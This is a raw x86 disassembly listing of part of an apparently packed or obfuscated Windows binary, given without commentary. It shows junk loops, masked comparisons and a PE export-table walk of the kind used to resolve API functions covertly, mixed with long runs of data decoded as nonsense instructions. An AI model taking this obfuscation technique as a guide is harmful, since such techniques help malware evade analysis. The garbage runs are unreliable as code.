  4072f9:	lods   eax,DWORD PTR ds:[esi]
  4072fa:	inc    ebp
  4072fb:	mov    BYTE PTR [ebp+0x47],dh
  4072fe:	stc    
  4072ff:	ds mov edx,0x17cc25bf
  407305:	cmp    DWORD PTR [edi],ecx
  407307:	push   cs
  407308:	add    eax,0x90f727c2
  40730d:	shr    DWORD PTR [ecx-0x6b7c46a2],cl
  407313:	mov    DWORD PTR [ebp-0x1c],ecx
  407316:	and    DWORD PTR ds:0x4292a5,ebx
  40731c:	imul   edx,eax
  40731f:	neg    esi
  407321:	mov    ecx,0x4573
  407326:	add    edx,ecx
  407328:	mov    esi,0x7879
  40732d:	and    DWORD PTR ds:0x42c88e,0x0
  407337:	xor    edi,edi
  407339:	add    edi,DWORD PTR ds:0x42c88e
  40733f:	inc    edi
  407340:	mov    DWORD PTR ds:0x42c88e,edi
  407346:	cmp    DWORD PTR ds:0x42c88e,0x26
  40734d:	jne    0x407368
  407353:	push   0x70d3
  407358:	push   0x0
  40735a:	push   DWORD PTR [ebp-0x10]
  40735d:	push   0x5a5a
  407362:	call   DWORD PTR ds:0x427acf
  407368:	cmp    DWORD PTR ds:0x42c88e,0x19
  40736f:	jb     0x407337
  407375:	and    DWORD PTR ds:0x42c89e,0x0
  40737f:	mov    edi,DWORD PTR ds:0x42c89e
  407385:	inc    edi
  407386:	mov    DWORD PTR ds:0x42c89e,edi
  40738c:	cmp    DWORD PTR ds:0x42c89e,0xb
  407393:	jne    0x4073a5
  407399:	push   DWORD PTR [ebp-0x24]
  40739c:	push   DWORD PTR [ebp-0x14]
  40739f:	call   DWORD PTR ds:0x4279f7
  4073a5:	cmp    DWORD PTR ds:0x42c89e,0xa
  4073ac:	jne    0x4073bf
  4073b2:	mov    edi,DWORD PTR ds:0x42c89e
  4073b8:	inc    edi
  4073b9:	mov    DWORD PTR ds:0x42c89e,edi
  4073bf:	cmp    DWORD PTR ds:0x42c89e,0x1a
  4073c6:	jb     0x40737f
  4073cc:	xor    DWORD PTR ds:0x427d17,edx
  4073d2:	mov    edi,0x1556
  4073d7:	xchg   esi,ecx
  4073d9:	sub    edx,edi
  4073db:	sbb    ecx,DWORD PTR ds:0x4292d1
  4073e1:	xor    esi,esi
  4073e3:	mov    DWORD PTR [ebp-0x28],esi
  4073e6:	or     ecx,DWORD PTR ds:0x427d1f
  4073ec:	mov    DWORD PTR [ebp-0x2c],esi
  4073ef:	mov    ecx,DWORD PTR ds:0x42c886
  4073f5:	xor    DWORD PTR ds:0x42759c,ecx
  4073fb:	mov    DWORD PTR [ebp-0x14],esi
  4073fe:	and    DWORD PTR ds:0x4292c1,0x0
  407408:	jmp    0x40741c
  40740d:	xor    ecx,ecx
  40740f:	or     ecx,DWORD PTR ds:0x4292c1
  407415:	inc    ecx
  407416:	mov    DWORD PTR ds:0x4292c1,ecx
  40741c:	cmp    DWORD PTR ds:0x4292c1,0x12
  407423:	jae    0x4075d0
  407429:	cmp    DWORD PTR ds:0x4292c1,0x1e
  407430:	jne    0x40743c
  407436:	call   DWORD PTR ds:0x427ad3
  40743c:	jmp    0x40740d
  407441:	sub    ecx,0x7ae1
  407447:	jmp    0x4075d0
  40744c:	add    DWORD PTR [eax-0xd],edx
  40744f:	sbb    esp,DWORD PTR [ebp-0x5]
  407452:	cdq    
  407453:	push   0xffffffc7
  407455:	stos   BYTE PTR es:[edi],al
  407456:	cmp    eax,eax
  407458:	inc    edx
  407459:	faddp  st(4),st
  40745b:	in     al,dx
  40745c:	and    DWORD PTR [eax],0x7c
  40745f:	jl     0x407449
  407461:	jg     0x4074df
  407463:	jl     0x4073ec
  407465:	mov    ebp,0x42295fa4
  40746a:	retf   0xeef7
  40746d:	clc    
  40746e:	ret    
  40746f:	xor    ebx,esi
  407471:	xchg   esp,eax
  407472:	add    BYTE PTR [esi+0x1a],ah
  407475:	jb     0x407496
  407477:	dec    ecx
  407478:	dec    edx
  407479:	xchg   ecx,eax
  40747a:	mov    ah,0x1e
  40747c:	mov    al,0xa8
  40747e:	ja     0x40746c
  407480:	or     dl,bh
  407482:	dec    ebx
  407483:	inc    ebx
  407484:	stos   DWORD PTR es:[edi],eax
  407485:	cli    
  407486:	or     cl,BYTE PTR [edx+0xd00fb91]
  40748c:	xor    al,BYTE PTR ds:0x31904df
  407492:	pushf  
  407493:	jge    0x4074d2
  407495:	xor    dh,ah
  407497:	es jmp 0x3699:0x71b7919f
  40749f:	outs   dx,BYTE PTR ds:[esi]
  4074a0:	into   
  4074a1:	jge    0x4074ae
  4074a3:	fisttp QWORD PTR [esi+0xd43da4c]
  4074a9:	cli    
  4074aa:	add    BYTE PTR [ecx+0x2414bda9],bl
  4074b0:	xchg   esp,eax
  4074b1:	mov    ah,0x76
  4074b3:	(bad)  
  4074b4:	mov    edi,0xf0fe156e
  4074b9:	(bad)  
  4074ba:	call   DWORD PTR [edi-0x5d]
  4074bd:	fstp   QWORD PTR [eax+0x74]
  4074c0:	push   ebx
  4074c1:	js     0x407477
  4074c3:	cmp    edx,DWORD PTR [eax+0x2b280495]
  4074c9:	push   ecx
  4074ca:	fbld   TBYTE PTR [edi+0x7e]
  4074cd:	adc    al,0xf
  4074cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d0:	jo     0x407462
  4074d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d3:	outs   dx,DWORD PTR ds:[esi]
  4074d4:	in     eax,dx
  4074d5:	xchg   edi,eax
  4074d6:	pop    ebx
  4074d7:	add    BYTE PTR [edx-0x41141d28],bl
  4074dd:	iret   
  4074de:	xor    ecx,ebp
  4074e0:	xor    al,0xe4
  4074e2:	rcl    dh,1
  4074e4:	jle    0x4074a5
  4074e6:	mov    bl,0x2d
  4074e8:	fwait
  4074e9:	push   ebx
  4074ea:	out    0xee,al
  4074ec:	mov    ds:0x4bc01d18,eax
  4074f1:	jle    0x40753a
  4074f3:	add    BYTE PTR [ebx],bl
  4074f5:	add    BYTE PTR [edi+ecx*4+0x7f],bl
  4074f9:	xchg   ecx,eax
  4074fa:	test   ah,ch
  4074fc:	adc    ch,cl
  4074fe:	inc    ebp
  4074ff:	mov    bl,0xda
  407501:	xor    al,0x4b
  407503:	daa    
  407504:	xchg   BYTE PTR [ebp-0x32],bh
  407507:	dec    eax
  407508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407509:	and    cl,cl
  40750b:	jl     0x4074b0
  40750d:	call   0x426f:0xfaaacc9d
  407514:	jmp    0x407501
  407516:	mov    ds:0x2568c241,al
  40751b:	jl     0x407594
  40751d:	add    eax,DWORD PTR [ebx]
  40751f:	iret   
  407520:	jnp    0x407596
  407522:	jno    0x407542
  407524:	outs   dx,DWORD PTR ds:[esi]
  407525:	sub    ah,BYTE PTR [edi*4+0x24b47a29]
  40752c:	imul   edi,DWORD PTR [edi+esi*2-0x77],0xffffffb4
  407531:	shl    DWORD PTR [edi-0x61],cl
  407534:	inc    eax
  407535:	xor    al,0xfd
  407537:	outs   dx,BYTE PTR ds:[esi]
  407538:	push   ebp
  407539:	test   al,0x9c
  40753b:	mul    ebx
  40753d:	call   0x5fee:0x4ce0b68
  407544:	dec    eax
  407545:	and    dh,dl
  407547:	(bad)  
  407548:	pop    ds
  407549:	xchg   DWORD PTR [eax+edi*8-0x33fa7b2e],edi
  407550:	(bad)  
  407551:	aam    0xf1
  407553:	xlat   BYTE PTR ds:[ebx]
  407554:	sub    DWORD PTR [esi-0x190dcf36],0xce8ce437
  40755e:	cmc    
  40755f:	outs   dx,BYTE PTR ds:[esi]
  407560:	out    dx,al
  407561:	adc    DWORD PTR [ebp+0x25],eax
  407564:	pop    esp
  407565:	add    al,0xb5
  407567:	add    ebp,DWORD PTR [ecx]
  407569:	pop    eax
  40756a:	stos   BYTE PTR es:[edi],al
  40756b:	sbb    eax,0x76da013c
  407570:	mov    al,0xb4
  407572:	inc    ebp
  407573:	jmp    0x407513
  407575:	neg    DWORD PTR [edi]
  407577:	inc    edx
  407578:	jns    0x40758c
  40757a:	mov    edx,0xbe689d5e
  40757f:	cs sahf 
  407581:	out    0x19,eax
  407583:	cmp    BYTE PTR [ebp-0x7f50c282],bh
  407589:	sub    esp,DWORD PTR [eax]
  40758b:	stos   BYTE PTR es:[edi],al
  40758c:	jge    0x407552
  40758e:	xchg   esp,eax
  40758f:	add    al,0x55
  407591:	rol    BYTE PTR [eax-0x68674e29],cl
  407597:	enter  0x39cb,0xa1
  40759b:	lods   al,BYTE PTR ds:[esi]
  40759c:	(bad)  
  40759d:	in     eax,dx
  40759e:	ins    BYTE PTR es:[edi],dx
  40759f:	mov    ecx,esp
  4075a1:	cmp    ebx,eax
  4075a3:	sbb    DWORD PTR [edi-0x7109fe75],0x7
  4075aa:	ret    0x95b1
  4075ad:	or     BYTE PTR [eax],0xdb
  4075b0:	xor    edx,DWORD PTR [ebx-0x14]
  4075b3:	sub    DWORD PTR [ebx],esi
  4075b5:	(bad)  [ebx-0x26]
  4075b8:	add    eax,0x353adb3f
  4075bd:	rcl    BYTE PTR [ecx],cl
  4075bf:	mov    ebx,0x4aeb0e70
  4075c4:	mov    WORD PTR [edi],gs
  4075c6:	sbb    esi,DWORD PTR [eax+0x19]
  4075c9:	rcl    edx,cl
  4075cb:	ret    0xb87d
  4075ce:	ja     0x40761b
  4075d0:	mov    DWORD PTR [ebp-0x8],esi
  4075d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4075d6:	xor    ecx,eax
  4075d8:	movzx  eax,BYTE PTR ds:0x4292bd
  4075df:	add    eax,DWORD PTR ds:0x4275b0
  4075e5:	mov    ds:0x4292bd,eax
  4075ea:	xor    edi,edi
  4075ec:	and    eax,DWORD PTR ds:0x427594
  4075f2:	jmp    0x40777b
  4075f7:	dec    cl
  4075f9:	pushf  
  4075fa:	adc    dl,BYTE PTR [edi+0x6d]
  4075fd:	repnz ins DWORD PTR es:[edi],dx
  4075ff:	xchg   esi,eax
  407600:	dec    eax
  407601:	fstp   DWORD PTR [ebp-0x47]
  407604:	lock xchg esi,eax
  407606:	mov    ecx,0x7c7c227f
  40760b:	call   0x5bcf28f
  407610:	test   BYTE PTR [ecx+0x58],bh
  407613:	outs   dx,DWORD PTR ds:[esi]
  407614:	mov    dh,0xf
  407616:	into   
  407617:	pop    ecx
  407618:	push   ss
  407619:	mov    WORD PTR ds:0x2ba09253,gs
  40761f:	sbb    BYTE PTR [ebx-0x4aa830f9],ch
  407625:	mov    BYTE PTR [ebp-0x27eab0cf],ah
  40762b:	jl     0x40766f
  40762d:	add    eax,0xd6400522
  407632:	jmp    0x7ecab32b
  407637:	and    al,0x27
  407639:	arpl   WORD PTR [esi],bx
  40763b:	fcmovne st,st(7)
  40763d:	or     bh,BYTE PTR [edx]
  40763f:	sbb    BYTE PTR fs:[edi],0x16
  407643:	cmp    dh,0x75
  407646:	or     al,0xee
  407648:	pop    edi
  407649:	xlat   BYTE PTR ds:[ebx]
  40764a:	push   eax
  40764b:	pop    ebp
  40764c:	jne    0x40769b
  40764e:	jl     0x407632
  407650:	push   0xffffffaa
  407652:	les    esp,FWORD PTR [ecx+0x12]
  407655:	jmp    0xc9aae60e
  40765a:	ss jg  0x4076c3
  40765d:	jp     0x4076d1
  40765f:	sub    DWORD PTR [esi-0x17215962],eax
  407665:	mov    al,0x48
  407667:	xor    BYTE PTR [edi-0x6de974ba],dh
  40766d:	call   0xf73d:0x96ca5ab8
  407674:	xchg   DWORD PTR [edi+0x5c],ebp
  407677:	or     al,0x5f
  407679:	push   es
  40767a:	or     dh,ch
  40767c:	(bad)  
  40767d:	mov    esi,0x6400ca9a
  407682:	pop    ebx
  407683:	add    ch,BYTE PTR [ecx-0x63]
  407686:	pop    esi
  407687:	lods   eax,DWORD PTR ds:[esi]
  407688:	xor    edx,DWORD PTR [ecx-0x2c]
  40768b:	push   eax
  40768c:	aaa    
  40768d:	mov    ebx,0x588f0fb8
  407692:	mov    cl,0x78
  407694:	xchg   ecx,eax
  407695:	leave  
  407696:	ins    BYTE PTR es:[edi],dx
  407697:	stos   DWORD PTR es:[edi],eax
  407698:	cmp    BYTE PTR [ecx],ah
  40769a:	and    DWORD PTR [eax+0x4f],ecx
  40769d:	loop   0x407631
  40769f:	mov    esp,0xc9ee54f3
  4076a4:	ja     0x4076b5
  4076a6:	jmp    esp
  4076a8:	jp     0x4076c2
  4076aa:	inc    ebp
  4076ab:	fs push ebx
  4076ad:	jmp    0x407659
  4076af:	imul   esi,DWORD PTR [edx-0x59],0x29
  4076b3:	into   
  4076b4:	adc    ah,cl
  4076b6:	mov    edi,0xcc488ad6
  4076bb:	pop    ebp
  4076bc:	test   al,0x4e
  4076be:	xor    BYTE PTR [ecx-0x41],0xd
  4076c2:	pop    eax
  4076c3:	inc    ecx
  4076c4:	sbb    BYTE PTR [edi+ecx*1+0x12c2008f],bh
  4076cb:	pop    ecx
  4076cc:	aaa    
  4076cd:	fsub   QWORD PTR [ecx-0x77]
  4076d0:	stc    
  4076d1:	and    BYTE PTR [ecx],bh
  4076d3:	cmovno edi,DWORD PTR [edi-0x506760dc]
  4076da:	cmp    DWORD PTR [ebp-0x5e],eax
  4076dd:	idiv   ebp
  4076df:	jmp    0x4076d4
  4076e1:	jecxz  0x407734
  4076e3:	mov    bl,0x77
  4076e5:	inc    esi
  4076e6:	xchg   esp,eax
  4076e7:	add    edx,0x79
  4076ea:	sub    eax,0x8e2be67e
  4076ef:	hlt    
  4076f0:	xor    DWORD PTR [edi+edi*1-0x7fc8c4fe],0xfffffffa
  4076f8:	fisubr DWORD PTR [ecx+esi*1-0xd0fb5b]
  4076ff:	data16 sub al,0x2a
  407702:	adc    cl,BYTE PTR [esi]
  407704:	sub    ebp,ecx
  407706:	cli    
  407707:	jne    0x40776b
  407709:	fwait
  40770a:	int3   
  40770b:	(bad)  
  40770c:	inc    dh
  40770e:	ret    0xfeb1
  407711:	jb     0x4076ac
  407713:	pop    edi
  407714:	in     al,0xa7
  407716:	seta   BYTE PTR [eax-0x1558518]
  40771d:	not    DWORD PTR [edx-0x2d]
  407720:	cmp    eax,0x77517630
  407725:	push   ds
  407726:	inc    esi
  407727:	icebp  
  407728:	xor    ebp,DWORD PTR [edi*4-0x2b46b363]
  40772f:	or     ah,ch
  407731:	inc    esp
  407732:	xor    dh,dl
  407734:	push   edx
  407735:	push   edx
  407736:	xchg   ebp,eax
  407737:	push   0xffffff98
  407739:	mov    DWORD PTR [esi],esi
  40773b:	stos   DWORD PTR es:[edi],eax
  40773c:	sub    eax,0x376426b8
  407741:	inc    edi
  407742:	sub    eax,0x62f93ef3
  407747:	ret    0x5fac
  40774a:	add    dh,BYTE PTR [eax+eiz*2+0x7e]
  40774e:	cli    
  40774f:	xor    BYTE PTR [eax-0x2963c957],bl
  407755:	fs arpl cx,dx
  407758:	loopne 0x4076ec
  40775a:	ret    0x9147
  40775d:	push   0x65
  40775f:	push   ebp
  407760:	(bad)  
  407761:	xor    ah,ah
  407763:	pop    edx
  407764:	in     al,0xb5
  407766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407767:	pusha  
  407768:	xor    eax,0x15546db6
  40776d:	cwde   
  40776e:	imul   eax,DWORD PTR [eax-0x6d28c80e],0x29afa5c6
  407778:	pop    ss
  407779:	ret    
  40777a:	xchg   ebp,eax
  40777b:	add    ecx,ebx
  40777d:	mov    DWORD PTR [ebp-0x20],ecx
  407780:	mov    eax,DWORD PTR [ebp-0x20]
  407783:	je     0x407a73
  407789:	and    DWORD PTR ds:0x42c882,0x0
  407793:	xor    eax,eax
  407795:	xor    eax,DWORD PTR ds:0x42c882
  40779b:	inc    eax
  40779c:	mov    ds:0x42c882,eax
  4077a1:	cmp    DWORD PTR ds:0x42c882,0x16
  4077a8:	jne    0x4077b9
  4077ae:	push   0x42785c
  4077b3:	call   DWORD PTR ds:0x427c77
  4077b9:	cmp    DWORD PTR ds:0x42c882,0x11
  4077c0:	jb     0x407793
  4077c6:	mov    eax,ds:0x42c88e
  4077cb:	xor    DWORD PTR ds:0x4292dd,eax
  4077d1:	mov    eax,DWORD PTR [ebp-0x4]
  4077d4:	xor    eax,0x7510857
  4077d9:	xor    DWORD PTR ds:0x4292c9,0x4292c1
  4077e3:	add    eax,ebx
  4077e5:	cmp    edi,eax
  4077e7:	jne    0x40788d
  4077ed:	sub    DWORD PTR ds:0x42759c,0x4275a4
  4077f7:	push   DWORD PTR [ebp+0x8]
  4077fa:	call   0x4063f7
  4077ff:	mov    DWORD PTR [ebp-0x20],eax
  407802:	xor    eax,eax
  407804:	add    eax,DWORD PTR ds:0x4292f5
  40780a:	xor    esi,esi
  40780c:	xor    esi,DWORD PTR ds:0x4278af
  407812:	sub    esi,eax
  407814:	sub    eax,DWORD PTR [eax+esi*1]
  407817:	mov    eax,DWORD PTR [ebp-0x4]
  40781a:	sub    esi,DWORD PTR ds:0x42c896
  407820:	mov    ecx,DWORD PTR [ebp-0x20]
  407823:	mov    esi,0x7510857
  407828:	xor    eax,esi
  40782a:	adc    DWORD PTR ds:0x4292b9,0x7173
  407834:	add    eax,ebx
  407836:	cmp    ecx,eax
  407838:	je     0x407a57
  40783e:	push   DWORD PTR [ebp-0x20]
  407841:	push   DWORD PTR [ebp+0x8]
  407844:	call   0x4064f3
  407849:	mov    DWORD PTR [ebp-0x14],eax
  40784c:	mov    eax,DWORD PTR [ebp-0x4]
  40784f:	mov    ecx,DWORD PTR [ebp-0x14]
  407852:	xor    eax,esi
  407854:	add    eax,ebx
  407856:	cmp    ecx,eax
  407858:	je     0x407a57
  40785e:	mov    eax,DWORD PTR [ebp-0x14]
  407861:	mov    eax,DWORD PTR [eax+0x18]
  407864:	mov    DWORD PTR [ebp-0x20],eax
  407867:	mov    eax,DWORD PTR [ebp-0x14]
  40786a:	mov    ecx,DWORD PTR [ebp+0x8]
  40786d:	add    ecx,DWORD PTR [eax+0x20]
  407870:	mov    DWORD PTR [ebp-0x28],ecx
  407873:	mov    eax,DWORD PTR [ebp-0x14]
  407876:	mov    ecx,DWORD PTR [ebp+0x8]
  407879:	add    ecx,DWORD PTR [eax+0x24]
  40787c:	mov    DWORD PTR [ebp-0x2c],ecx
  40787f:	mov    eax,DWORD PTR [ebp-0x14]
  407882:	mov    ecx,DWORD PTR [ebp+0x8]
  407885:	add    ecx,DWORD PTR [eax+0x1c]
  407888:	xor    esi,esi
  40788a:	mov    DWORD PTR [ebp-0x14],ecx
  40788d:	mov    eax,DWORD PTR [ebp-0x28]
  407890:	mov    ecx,DWORD PTR [ebp+0x8]
  407893:	add    ecx,DWORD PTR [eax+edi*4]
  407896:	lea    eax,[ebp-0x8]
  407899:	mov    DWORD PTR [ebp-0x30],ecx
  40789c:	push   eax
  40789d:	push   DWORD PTR [ebp-0x30]
  4078a0:	push   DWORD PTR [ebp+0xc]
  4078a3:	call   0x403932
  4078a8:	mov    eax,DWORD PTR [ebp-0x4]
  4078ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4078ae:	xor    eax,0x7510857
  4078b3:	add    eax,ebx
  4078b5:	jmp    0x407a3e
  4078ba:	retf   
  4078bb:	idiv   BYTE PTR [edi+0x6de9b5d6]
  4078c1:	lods   eax,DWORD PTR ds:[esi]
  4078c2:	out    0xb6,al
  4078c4:	scas   eax,DWORD PTR es:[edi]
  4078c5:	xchg   DWORD PTR [ebx+edi*1-0x1e],ecx
  4078c9:	push   ebp
  4078ca:	jmp    0x4078f1
  4078cc:	jl     0x40794a
  4078ce:	call   0x17bcf552
  4078d3:	imul   ebp,DWORD PTR ds:0x77d3d517,0xffffffa2
  4078da:	ds pop es
  4078dc:	sub    DWORD PTR gs:[eax],esi
  4078df:	jmp    0x40794a
  4078e1:	(bad)  
  4078e2:	jmp    0x118d:0xbbdd1f70
  4078e9:	adc    al,cl
  4078eb:	aad    0x24
  4078ed:	out    0xfa,eax
  4078ef:	pop    esi
  4078f0:	repnz test al,0x7a
  4078f3:	loop   0x407956
  4078f5:	cmp    eax,0x45664fd1
  4078fa:	add    BYTE PTR [ebp+0x43],cl
  4078fd:	out    0xb4,eax
  4078ff:	jecxz  0x40792e
  407901:	repnz adc BYTE PTR [eax-0x6d40792a],cl
  407908:	cmp    eax,0x5bd51584
  40790d:	push   0xffffffb4
  40790f:	or     ah,BYTE PTR [edx]
  407911:	sbb    BYTE PTR [edx],ch
  407913:	jecxz  0x40790f
  407915:	jmp    0x2b7c7032
  40791a:	and    eax,0x141b0e4c
  40791f:	mov    ebx,0xd9825273
  407924:	inc    esp
  407925:	inc    eax
  407926:	rcr    ah,0xea
  407929:	stos   BYTE PTR es:[edi],al
  40792a:	jl     0x4078c3
  40792c:	sahf   
  40792d:	and    BYTE PTR [ebx],ah
  40792f:	xchg   ecx,eax
  407930:	jb     0x407901
  407932:	imul   ebx,DWORD PTR [esi+esi*4+0x26a4d3c8],0x1a415d86
  40793d:	push   esi
  40793e:	jb     0x407908
  407940:	and    DWORD PTR [ebp+0x42],esp
  407943:	fdiv   DWORD PTR [edx*2+0x4e22a457]
  40794a:	adc    al,0xdb
  40794c:	fadd   st(1),st
  40794e:	jae    0x40798f
  407950:	inc    edi
  407951:	jp     0x4078d9
  407953:	stos   BYTE PTR es:[edi],al
  407954:	call   0x51b2e637
  407959:	sub    eax,0x2046a014
  40795e:	ret    0xe19b
  407961:	out    dx,eax
  407962:	adc    eax,DWORD PTR [ebx+0x48fea506]
  407968:	and    dl,bl
  40796a:	xchg   edi,eax
  40796b:	mov    BYTE PTR [ebp-0x38],0xbd
  40796f:	scas   al,BYTE PTR es:[edi]
  407970:	nop
  407971:	mov    cl,0xb4
  407973:	stos   BYTE PTR es:[edi],al
  407974:	cli    
  407975:	rcr    BYTE PTR [eax-0x65],1
  407978:	sbb    eax,0xdc3528ae
  40797d:	sub    DWORD PTR [ecx-0x8],esi
  407980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407981:	outs   dx,DWORD PTR ds:[esi]
  407982:	test   al,0x30
  407984:	xchg   edx,eax
  407985:	rcr    DWORD PTR ds:0xbcd470e3,0xe1
  40798c:	mov    ecx,0xb25857e4
  407991:	push   edi
  407992:	mov    ebp,0x44d45535
  407997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407998:	xchg   edx,eax
  407999:	out    0xd4,eax
  40799b:	jl     0x407a03
  40799d:	jmp    0xe4bd:0x6e4b182a
  4079a4:	push   0xffffffdd
  4079a6:	sbb    DWORD PTR [esi+0x734f2ca1],0xf332aeca
  4079b0:	in     eax,dx
  4079b1:	daa    
  4079b2:	clc    
  4079b3:	jge    0x4079d8
  4079b5:	push   0x7df880ee
  4079ba:	sub    DWORD PTR [esi-0x15b1a21],0x1f
  4079c1:	and    ecx,DWORD PTR [esi+0x5bb546e8]
  4079c7:	adc    al,0xf3
  4079c9:	add    eax,0x8f88b83d
  4079ce:	and    cl,0x6b
  4079d1:	mov    bl,BYTE PTR [edx-0x390294aa]
  4079d7:	xor    BYTE PTR [ebx+edi*1],al
  4079da:	jb     0x407a3b
  4079dc:	inc    edx
  4079dd:	push   ebp
  4079de:	fist   WORD PTR [eax]
  4079e0:	adc    al,0xbb
  4079e2:	lds    edi,FWORD PTR [edi]
  4079e4:	pusha  
  4079e5:	sahf   
  4079e6:	push   es
  4079e7:	aad    0xee
  4079e9:	xor    DWORD PTR [ecx+0x4e0cabf4],0xffffffe2
  4079f0:	aaa    
  4079f1:	fisubr WORD PTR [edi]
  4079f3:	push   ebx
  4079f4:	mov    ch,0xe3
  4079f6:	cmp    ah,BYTE PTR [esi-0x2fcb888d]
  4079fc:	mov    cl,0xec
  4079fe:	push   ecx
  4079ff:	ja     0x407a69
  407a01:	add    al,0xd0
  407a03:	mov    es:0xbd5dbf0d,al
  407a09:	push   eax
  407a0a:	lods   eax,DWORD PTR ds:[esi]
  407a0b:	(bad)  
  407a0c:	out    dx,eax
  407a0d:	fs jo  0x407a59
  407a10:	aam    0xb
  407a12:	inc    esi
  407a13:	imul   edx,DWORD PTR [esi],0x47
  407a16:	and    cl,BYTE PTR [edi+0x4]
  407a19:	in     al,dx
  407a1a:	(bad)  
  407a1b:	enter  0xc386,0x49
  407a1f:	daa    
  407a20:	call   DWORD PTR [eax+eiz*1-0x79df7421]
  407a27:	stos   DWORD PTR es:[edi],eax
  407a28:	dec    esi
  407a29:	lock sub BYTE PTR [eax],0x41
  407a2d:	addr16 xchg edx,eax
  407a2f:	add    BYTE PTR [ecx+0x45],bh
  407a32:	ror    edi,cl
  407a34:	cs in  eax,dx
  407a36:	add    cl,BYTE PTR [edi-0xf]
  407a39:	mov    ah,0x10
  407a3b:	jecxz  0x407a88
  407a3d:	push   ebp
  407a3e:	cmp    ecx,eax
  407a40:	jne    0x407a63
  407a46:	mov    eax,DWORD PTR [ebp-0x20]
  407a49:	inc    edi
  407a4a:	cmp    edi,eax
  407a4c:	jb     0x407789
  407a52:	jmp    0x407a73
  407a57:	mov    eax,DWORD PTR [ebp-0x4]
  407a5a:	xor    eax,esi
  407a5c:	add    eax,ebx
  407a5e:	jmp    0x408b1b
  407a63:	mov    eax,DWORD PTR [ebp-0x2c]
  407a66:	movzx  eax,WORD PTR [eax+edi*2]
  407a6a:	mov    ecx,DWORD PTR [ebp-0x14]
  407a6d:	mov    eax,DWORD PTR [ecx+eax*4]
  407a70:	mov    DWORD PTR [ebp+0xc],eax
  407a73:	mov    eax,DWORD PTR [ebp-0x4]
  407a76:	mov    ecx,DWORD PTR [ebp-0x8]
  407a79:	xor    eax,0x7510857
  407a7e:	add    eax,ebx
  407a80:	cmp    ecx,eax
  407a82:	jne    0x407a95
  407a88:	mov    eax,DWORD PTR [ebp-0x4]
  407a8b:	xor    eax,0x7510857
  407a90:	jmp    0x407a5c
  407a95:	mov    eax,DWORD PTR [ebp+0xc]
  407a98:	add    eax,DWORD PTR [ebp+0x8]
  407a9b:	mov    DWORD PTR [ebp-0x10],eax
  407a9e:	mov    eax,DWORD PTR [ebp-0x1c]
  407aa1:	test   eax,eax
  407aa3:	je     0x4087bb
  407aa9:	mov    DWORD PTR [ebp-0x24],esi
  407aac:	push   0xb
  407aae:	pop    ecx
  407aaf:	push   0x5
  407ab1:	dec    ecx
  407ab2:	pop    ebx
  407ab3:	xchg   ebx,ecx
  407ab5:	sub    ebx,ecx
  407ab7:	xchg   ebx,ecx
  407ab9:	dec    ecx
  407aba:	jmp    0x407c43
  407abf:	adc    edi,DWORD PTR [eax+0x2d9d7285]
  407ac5:	mov    ds:0xbdc820bd,eax
  407aca:	inc    edx
  407acb:	add    edi,ebx
  407acd:	mov    ah,BYTE PTR [esi+0x7c7c2447]
  407ad3:	call   0x30bcf757
  407ad8:	out    0xac,al
  407ada:	sub    ebp,edi
  407adc:	fwait
  407add:	punpckhbw mm3,QWORD PTR [eax-0x1582a4bf]
  407ae4:	adc    eax,0x4df58356
  407ae9:	push   0x47
  407aeb:	push   ebx
  407aec:	cmc    
  407aed:	fs sbb edi,ebx
  407af0:	mov    esp,0xf6c4b059
  407af5:	popa   
  407af6:	neg    BYTE PTR [eax]
  407af8:	ins    DWORD PTR es:[edi],dx
  407af9:	push   eax
  407afa:	stos   DWORD PTR es:[edi],eax
  407afb:	sti    
  407afc:	push   ecx
  407afd:	adc    esi,DWORD PTR [esi+0x7c]
  407b00:	pushf  
  407b01:	loop   0x407b01
  407b03:	sbb    eax,0x3c257e8b
  407b08:	xor    al,0x6c
  407b0a:	lds    esi,FWORD PTR [ebx]
  407b0c:	loopne 0x407ad2
  407b0e:	sub    DWORD PTR [ecx-0x11a6901],edi
  407b14:	rcl    DWORD PTR [eax],cl
  407b16:	xchg   BYTE PTR [edi+ebx*2],bh
  407b19:	push   0x51
  407b1b:	mov    cl,0x93
  407b1d:	sub    DWORD PTR [eax+0x2a],eax
  407b20:	mov    cs,WORD PTR [ebp+0x6c7bc06f]
  407b26:	jmp    0xbacef847
  407b2b:	sub    DWORD PTR [esi+0x25],edx
  407b2e:	out    dx,eax
  407b2f:	push   ss
  407b30:	push   ebx
  407b31:	inc    ebp
  407b32:	pop    ss
  407b33:	add    eax,0x4d608a05
  407b38:	loopne 0x407b29
  407b3a:	lahf   
  407b3b:	push   ss
  407b3c:	stc    
  407b3d:	popa   
  407b3e:	jmp    0x9b516713
  407b43:	sbb    al,0x62
  407b45:	and    al,0xff
  407b47:	mov    cl,0x86
  407b49:	lods   al,BYTE PTR ds:[esi]
  407b4a:	scas   al,BYTE PTR es:[edi]
  407b4b:	mov    ebp,0x22962494
  407b50:	mov    eax,0xe7b7af44
  407b55:	mov    ch,0x59
  407b57:	mov    ds:0x6294383,eax
  407b5c:	loop   0x407b7a
  407b5e:	jae    0x407b07
  407b60:	sub    ebx,DWORD PTR [esi]
  407b62:	cmp    esp,DWORD PTR [edx+0x74]
  407b65:	dec    ebp
  407b66:	sti    
  407b67:	inc    edi
  407b68:	cmp    edi,DWORD PTR [ebp+0x73a3fae4]
  407b6e:	jne    0x407b0e
  407b70:	fs out 0x5f,eax
  407b73:	ins    DWORD PTR es:[edi],dx
  407b74:	mov    ?,ecx
  407b76:	ins    BYTE PTR es:[edi],dx
  407b77:	cwde   
  407b78:	es in  al,dx
  407b7a:	std    
  407b7b:	fnsave [eax-0x6e]
  407b7e:	pop    ss
  407b7f:	add    eax,0x91528060
  407b84:	inc    ecx
  407b85:	pop    eax
  407b86:	int3   
  407b87:	mov    bh,0xc1
  407b89:	add    eax,0xb591c1ea
  407b8e:	xchg   ecx,eax
  407b8f:	in     al,dx
  407b90:	nop
  407b91:	xlat   BYTE PTR ds:[ebx]
  407b92:	retf   
  407b93:	mov    ecx,0x479ceec6
  407b98:	pop    edx
  407b99:	and    ah,dh
  407b9b:	daa    
